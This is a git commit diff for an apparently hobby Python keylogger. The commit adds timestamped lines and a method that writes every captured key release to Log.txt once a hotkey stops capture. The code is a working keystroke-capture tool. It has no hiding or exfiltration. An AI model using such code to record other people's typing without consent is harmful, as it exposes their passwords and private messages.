d4d1fd3ad05725253edce9906228ceb71c6b7946
FrankDawin <francoisdes@gmail.com>
2022-05-10 21:17:30 -0400

    added writer, timestamp

--- main.py
+++ main.py
@@ -2,13 +2,13 @@ import keyboard
 from datetime import datetime, date
 
 
-
 class Logger:
 
     def __init__(self):
         self.log = ""
         self.line = ""
-        self.line_length = 50
+        self.line_length = 20
+        self.log_filename = "Log.txt"
 
     def callback(self, event):
         """When a stroke happen this function is called"""
@@ -29,17 +29,22 @@ class Logger:
             elif name in exception_key:
                 name = ""
 
-        self.log += name
+        self.line += name
+
+        if name == " ":
+            self.count_line()
 
     def start(self):
         keyboard.on_release(callback=self.callback)
         keyboard.wait(hotkey='ctrl+shift+a')
         print(self.log)
+        self.write_log()
 
     def count_line(self):
         """Take a line and return True if it's become too long"""
 
         if len(self.line) >= self.line_length:
+            self.add_timestamp()
             self.log += "\n" + self.line
             self.line = ""
 
@@ -49,6 +54,13 @@ class Logger:
         now = datetime.now()
         time_string = now.strftime("%Y-%m-%d %H:%M:%S")
         self.line = time_string + ":  " + self.line
+
+    def write_log(self):
+        """Take the log and write it into a file"""
+
+        with open(self.log_filename, 'w') as a:
+            a.write(self.log)
+
 
 
 if __name__ == '__main__':
